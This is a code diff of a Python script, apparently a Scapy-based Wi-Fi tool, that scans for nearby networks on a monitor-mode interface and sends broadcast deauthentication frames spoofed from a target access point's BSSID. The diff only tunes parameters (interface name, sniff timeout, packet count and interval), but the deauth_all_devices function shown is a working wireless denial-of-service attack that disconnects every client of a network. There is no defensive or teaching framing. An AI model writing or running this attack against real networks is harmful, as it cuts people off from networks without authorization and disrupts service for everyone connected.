@@ -7,8 +7,7 @@ def get_wifi_networks(interface=None):
 
     if interface is None:
         for iface_name in get_if_list():
-            iface = get_if_raw(iface_name)
-            if "wlan" in iface_name:
+            if "wlan0mon" in iface_name:
                 interface = iface_name
                 break
 
@@ -17,7 +16,7 @@ def get_wifi_networks(interface=None):
             return networks
 
     try:
-        scan_result = sniff(iface=interface, timeout=10, prn=lambda x: x.summary())
+        scan_result = sniff(iface=interface, timeout=20, prn=lambda x: x.summary())
     except KeyboardInterrupt:
         pass
 
@@ -29,7 +28,7 @@ def get_wifi_networks(interface=None):
                 networks.append((essid, bssid))
     return networks
 
-def deauth_all_devices(target_bssid, iface=None, count=100):
+def deauth_all_devices(target_bssid, iface=None, count=10):
     if iface is None:
         iface = conf.iface
 
@@ -38,7 +37,7 @@ def deauth_all_devices(target_bssid, iface=None, count=100):
         / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target_bssid, addr3=target_bssid)
         / Dot11Deauth()
     )
-    sendp(deauth_packet, iface=iface, count=count, inter=0.1)
+    sendp(deauth_packet, iface=iface, count=count, inter=0.90)
 
 if __name__ == "__main__":
     print("Escaneando redes WI-FI ao redor...")
